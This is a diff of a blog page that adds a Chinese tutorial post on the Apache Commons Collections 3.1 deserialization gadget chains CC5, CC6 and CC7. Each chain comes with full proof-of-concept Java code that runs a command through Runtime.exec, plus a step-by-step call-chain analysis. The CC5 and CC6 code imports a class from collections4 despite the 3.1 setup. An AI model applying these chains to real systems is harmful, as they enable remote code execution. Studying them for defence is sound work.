@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">archive_a | Pp1ove</title>
+  <title itemprop="name">CC链学习-中 | Pp1ove</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -348,91 +348,419 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 75px;">
-</div>
-<div id="content" class="site-content">
-  <div id="main">
-    <header class="page-header">
-      <h1 class="cat-title">
-      归档</h1>
-      <span class="cat-des">
-        <p>
-        Archives</p>
-      </span>
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(\img\article\3.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\3.png">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      CC链学习-中</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="\img\custom\head.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="">Yasax1</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2021-7-13<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
-    <div id="main-part">
-      <article class="art">
-        <div class="art-main">
-          <div class="art-content">
-            <div id="archives">
-              <p style="text-align:right;">
-                [<span id="al_expand_collapse" style="cursor: s-resize;">
-                全部展开/收缩</span>
-              ]</p>
-              
-              
-              
-              
-              
-                
-                <h3 class="al_year">2021年</h3>
-              
-              
-                
-                <ul class="al_mon_list">
-                  <li class="al_li">
-                    <span class="al_mon" style="cursor: s-resize;">
-                      07月(<span id="post-num">
-                      3</span>
-                    篇文章)</span>
-                    <ul class="al_post_list" style="">
-              
-                      <li>
-                        <a href="/2021/07/13/CC链学习-上/">
-                          <span style="color:#0bf;">
-                          13日11:03:25</span>
-                          CC链学习-上
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2021/07/13/CC链学习-下/">
-                          <span style="color:#0bf;">
-                          13日11:03:25</span>
-                          CC链学习-下
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2021/07/13/CC链学习-中/">
-                          <span style="color:#0bf;">
-                          13日11:03:25</span>
-                          CC链学习-中
-                        </a>
-                      </li>
-                      
-                    </ul>
-                  </li>
-                </ul>
-              
-              
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
+<li>jdk1.7</li>
+<li>Commons Collections 3.1</li>
+</ul>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+
+public class CC51 {
+        public static Object generatePayload() throws Exception {
+            ChainedTransformer Transformerchain = new ChainedTransformer(new Transformer[] {
+                    new ConstantTransformer(Runtime.class),
+                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                            String.class, Class[].class }, new Object[] {
+                            &quot;getRuntime&quot;, new Class[0] }),
+                    new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                            Object.class, Object[].class }, new Object[] {
+                            null, new Object[0] }),
+                    new InvokerTransformer(&quot;exec&quot;,
+                            new Class[] { String.class }, new Object[]{&quot;calc&quot;})});
+            HashMap innermap = new HashMap();
+            LazyMap map = (LazyMap)LazyMap.decorate(innermap,Transformerchain);
+            TiedMapEntry tiedmap = new TiedMapEntry(map,123);
+            BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
+            Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);
+            val.setAccessible(true);
+            val.set(poc,tiedmap);
+            return poc;
+        }
+    public static void main(String[] args) throws Exception {
+        payload2File(generatePayload(),&quot;obj&quot;);
+        payloadTest(&quot;obj&quot;);
+    }
+    public static void payload2File(Object instance, String file)
+            throws Exception {
+        //将构造好的payload序列化后写入文件中
+        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
+        out.writeObject(instance);
+        out.flush();
+        out.close();
+    }
+    public static void payloadTest(String file) throws Exception {
+        //读取写入的payload，并进行反序列化
+        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
+        in.readObject();
+        in.close();
+    }
+}
+</code></pre>
+<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><pre><code>  ObjectInputStream.readObject()
+            BadAttributeValueExpException.readObject()
+                TiedMapEntry.toString()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
+</code></pre><p>通过利用链其实可以看出来,CC5的后半段利用链和CC1的lazymap那条链后面段是一样的,都是调用LazyMap的get方法触发命令,这里我们主要看前面是如何调用到LazyMap.get()的;</p>
+<h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714094609515.png" alt="image-20210714094609515"></p>
+<p>在toString方法中调用了getValue()方法,跟进去</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714094825484.png" alt="image-20210714094825484"></p>
+<p>调用了map.get方法,关于map在构造函数中赋值,map成员可控,接下来我们需要找哪里调用了toString方法</p>
+<p>在cc5中使用了BadAttributeValueExpException这个类。</p>
+<h2 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714095345217.png" alt="image-20210714095345217"></p>
+<p>在该类的readObject方法中,调用了valObj.toString();那么这个valObj是从哪里来的呢</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714095556386.png" alt="image-20210714095556386"></p>
+<p>可以看到获取了val成员的值赋值给了valObj,这里我们让val=TiedMapEntry对象即可</p>
+<h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714105646430.png" alt="image-20210714105646430"></p>
+<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h2 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
+<li>jdk 1.7</li>
+<li>Commons Collections 3.1</li>
+</ul>
+<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre><code class="java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+
+public class CC61 {
+    public static Object generatePayload() throws Exception {
+        Transformer fakeTransformerransformer = new ChainedTransformer(new Transformer[]{});
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})
+        };
+
+        Map map = new HashMap();
+        Map lazyMap = LazyMap.decorate(map, fakeTransformerransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;keykey&quot;);
+
+        HashSet hashSet = new HashSet(1);
+        hashSet.add(tiedMapEntry);
+        lazyMap.remove(&quot;keykey&quot;);  //如果不加这个就无法弹出计算器
+
+        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令
+        Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+        field.setAccessible(true);
+        field.set(fakeTransformerransformer, transformers);
+        return hashSet;
+    }
+
+    public static void main(String[] args) throws Exception {
+        payload2File(generatePayload(), &quot;obj&quot;);
+        payloadTest(&quot;obj&quot;);
+    }
+
+    public static void payload2File(Object instance, String file)
+            throws Exception {
+        //将构造好的payload序列化后写入文件中
+        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
+        out.writeObject(instance);
+        out.flush();
+        out.close();
+    }
+
+    public static void payloadTest(String file) throws Exception {
+        //读取写入的payload，并进行反序列化
+        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
+        in.readObject();
+        in.close();
+    }
+}
+</code></pre>
+<h2 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h2><pre><code>java.io.ObjectInputStream.readObject()
+            HashSet.readObject()
+                HashMap.put()
+                HashMap.hash()
+                    TiedMapEntry.hashCode()
+                    TiedMapEntry.getValue()
+                        LazyMap.get()
+                            ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
+</code></pre><p>后面一段仍然是LazyMap.get(),主要还是看前半段</p>
+<h2 id="TiedMapEntry-1"><a href="#TiedMapEntry-1" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714111413078.png" alt="image-20210714111413078"></p>
+<p>TiedMapEntry调用了getValue()</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714111512897.png" alt="image-20210714111512897"></p>
+<p>getValue()方法调用了map成员的get方法,这里map成员可控,我们设置为lazymap对象</p>
+<p>接下来就需要找哪里触发了hashCode，cc6中使用的是HashMap#hash</p>
+<h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714111909307.png" alt="image-20210714111909307"></p>
+<p>而put方法调用了hash方法,并且我们可以可以将key作为hash方法的输入,接下来就还差一个入口了</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714112859486.png" alt="image-20210714112859486"></p>
+<h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><p>ysoserial选择的是HashSet#readObject()</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714113121440.png" alt="image-20210714113121440"></p>
+<p>在hashmap#readObject方法中调用了map对象的put方法,map对象是在上面几排赋的值,这里有个判断语句,这判断语句挺好控制的,这里我们需要让map=new HashMap(其实为LinkedHashMap也不影响,LinkedHashMap继承于HashMap,也没有重写put方法和hash方法),然后就是关于我们传入的e;参数e是用readObject取出来的，那么对应的我们就看看writeObject怎么写的:</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714122145577.png" alt="image-20210714122145577"></p>
+<p>我们需要控制传入map的keySet返回结果来控制变量。</p>
+<h2 id="流程图-1"><a href="#流程图-1" class="headerlink" title="流程图"></a>流程图</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714145614830.png" alt="image-20210714145614830"></p>
+<h2 id="P神版本"><a href="#P神版本" class="headerlink" title="P神版本"></a>P神版本</h2><p>在上面的流程的最后一步中,我们其实找到一个readObject方法能调用HashMap#put或者HashMap#hash就行了,而HashMap是自带readObject方法的,</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714122809872.png" alt="image-20210714122809872"></p>
+<p>跟进去</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714123104119.png" alt="image-20210714123104119"></p>
+<p>这里直接调用了hash方法,key也可控。</p>
+<h2 id="一些其他点"><a href="#一些其他点" class="headerlink" title="一些其他点"></a>一些其他点</h2><p>这里为了避免本地调试时触发命令执⾏，构造LazyMap的时候先⽤了⼀个⼈畜⽆害的 fakeTransformerransformer 对象，等最后要⽣成Payload的时候，再把真正的 transformers 替换进去。(如果正常写应该也没啥问题)</p>
+<p>但是如果去掉我们poc中的<code>lazyMap.remove(&quot;keykey&quot;);</code> Run的时候并不会弹出计算器,调试一下发现它并没有进入lazymap#get方法中的if语句,但是我们明明没有在lazyMap中加入”keykey”呀</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210702230438771.png" alt="image-20210702230438771"></p>
+<p>这是应该是因为在调用hashSet#add时调用了hashMap的put方法,</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210716184250749.png" alt="image-20210716184250749"></p>
+<p>HashMap的put⽅法中，也有调⽤到 hash(key)</p>
+<p>这⾥就导致 LazyMap 这个利⽤链在这⾥被调⽤了⼀遍，因为我前⾯⽤了fakeTransformers ,所以此</p>
+<p>时并没有触发命令执⾏,但实际上也对我们构造Payload产⽣了影响。</p>
+<p>解决⽅法也很简单，只需要将keykey这个Key,再从outerMap中移除即可： lazyMap.remove(“keykey”) </p>
+<h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="测试环境-2"><a href="#测试环境-2" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
+<li>jdk 1.8</li>
+<li>Commons Collections 3.1</li>
+</ul>
+<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><pre><code class="java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.AbstractMapDecorator;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.AbstractMap;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.Map;
+
+public class CC71 {
+
+    public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException {
+
+        Transformer[] fakeTransformerransformer = new Transformer[]{};
+
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})
+        };
+
+        //ChainedTransformer实例
+        //先设置假的 Transformer 数组，防止生成时执行命令
+        Transformer chainedTransformer = new ChainedTransformer(fakeTransformerransformer);
+
+        //LazyMap实例
+        Map innerMap1 = new HashMap();
+        Map innerMap2 = new HashMap();
+
+        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
+        lazyMap1.put(&quot;yy&quot;, 1);
+
+        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
+        lazyMap2.put(&quot;zZ&quot;, 1);
+
+
+
+
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1, &quot;test&quot;);
+        hashtable.put(lazyMap2, &quot;test&quot;);
+
+
+        //通过反射设置真的 ransformer 数组
+        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
+        field.setAccessible(true);
+        field.set(chainedTransformer, transformers);
+
+        //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=&gt;yy，所以这里要移除
+        lazyMap2.remove(&quot;yy&quot;);
+
+        //序列化
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(hashtable);
+        oos.flush();
+        oos.close();
+
+        //测试反序列化
+        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+    }
+
+}
+</code></pre>
+<h2 id="利用链-2"><a href="#利用链-2" class="headerlink" title="利用链"></a>利用链</h2><pre><code>Hashtable.readObject()
+      Hashtable.reconstitutionPut()
+            AbstractMapDecorator.equals()
+                AbstractMap.equals()
+                  LazyMap.get()
+                    ChainedTransformer.transform()
+                      ConstantTransformer.transform()
+                        InvokerTransformer.transform()
+                          …………
+</code></pre><p>后面还是LazyMap.get()</p>
+<h2 id="AbstractMap"><a href="#AbstractMap" class="headerlink" title="AbstractMap"></a>AbstractMap</h2><p>equals方法中调用了m.get(key);这里m和key可控。但是因为AbstractMap是一个abstract类,在构造poc时只能找它的子类,而且没有重写该方法,在poc中选择的就是它的子类HashMap</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714161347332.png" alt="image-20210714161347332"></p>
+<h2 id="AbstractMapDecorator"><a href="#AbstractMapDecorator" class="headerlink" title="AbstractMapDecorator"></a>AbstractMapDecorator</h2><p>Map可控。该类为lazpMap的父类</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714161507280.png" alt="image-20210714161507280"></p>
+<h2 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2><p>reconstitutionPut方法调用e.key.equals,参数可控</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714161637355.png" alt="image-20210714161637355"></p>
+<p>readObject入口处也直接调用了reconstitutionPut方法,</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714162131508.png" alt="image-20210714162131508"></p>
+<h2 id="流程图-2"><a href="#流程图-2" class="headerlink" title="流程图"></a>流程图</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714182441660.png" alt="image-20210714182441660"></p>
+<p>其实但看这流程图我觉得还是有一点昏的,我上面其实也有很多地方没有说清楚,比如为什么e.key可控,因为我觉得这些配合poc一起看得话可能更容易理解</p>
+<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714183108087.png" alt="image-20210714183108087"></p>
+<p>首先我们这里是put了两次,在进入reconstitutionPut方法前,会有一个for循环,这里我们的Key和Value是使用readObject得到的,那我们得先去看一下writeObject方法</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714183555492.png" alt="image-20210714183555492"></p>
+<p>writeObject中</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714183446274.png" alt="image-20210714183446274"></p>
+<p>很容易看出,这里传递的实际上就是HashTable#put时添加进去的key和value。</p>
+<p>当我们第一次进入reconstitutionPut方法时,tab数组是没有值的,所以无法进入for循环调用equals方法,tab[index]的赋值是在for循环的后面</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714223055484.png" alt="image-20210714223055484"></p>
+<p>当我们第二次进入reconstitutionPut方法时</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714224351616.png" alt="image-20210714224351616"></p>
+<p>我们的e.key是第一次put的值,key是第二次put的值。</p>
+<p>之前在看利用链时,我就在想,为什么这里能直接调用AbstractMap.equals(),为什么还要去先调用AbstractMapDecorator.equals()呢</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714230152615.png" alt="image-20210714230152615"></p>
+<p>于是自己做了一个测试,我把第一次put的值设置为hashMap,想直接调用AbstractMap.equals(new LazyMap())</p>
+<p><img src="/2021/07/13/CC链学习-中/image-20210714230601623.png" alt="image-20210714230601623"></p>
+<p>但是发现他第二次并没有如我们所愿进入for循环,原因时因为第一次传入hashMap时计算生成的index=0,而第二次传入lazyMap时生成的index=3,所以并不存在tab[3]。而两次put的都是lazymap的话,index计算出来都是等于3.这里看似e.key和key可控,但实际上还是有些限制的。</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="/img/custom/donate/zhifubaoSQ.jpg"></li>
+                <li class="wechat-code"><img src="/img/custom/donate/wechatSQ.jpg"></li>
+              </ul>
             </div>
           </div>
         </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
       </article>
-    </div>
-  </div>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre full previous">
+          
+            <a href="/2021/07/13/CC链学习-下/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\2.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="\img\article\2.png">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                CC链学习-下</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+      </section>
+      
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="\img\custom\head.jpg" itemprop="image" alt="Yasax1" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author">Yasax1</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i>一个好奇的人</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
 
     </div>    
     <div class="ins-search">
